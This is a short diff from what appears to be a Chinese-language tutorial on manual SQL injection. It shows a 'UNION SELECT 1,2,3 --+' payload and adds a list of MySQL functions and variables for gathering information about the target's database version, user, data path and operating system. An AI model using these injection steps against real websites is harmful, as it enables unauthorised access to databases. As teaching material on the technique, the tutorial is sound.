@@ -22,4 +22,11 @@ UNION SELECT 联合查询，手工注入经典语句，作用是在后面通过U
 UNION SELECT 1,2,3 --+
 ```
 4.**获取信息**
-···
+```
+version()            #MySQL版本
+user()               #数据库用户名
+database()           #数据库名
+@@datadir            #数据库路径
+@@version_compile_os #操作系统版本
+```
+5.**查询表名**
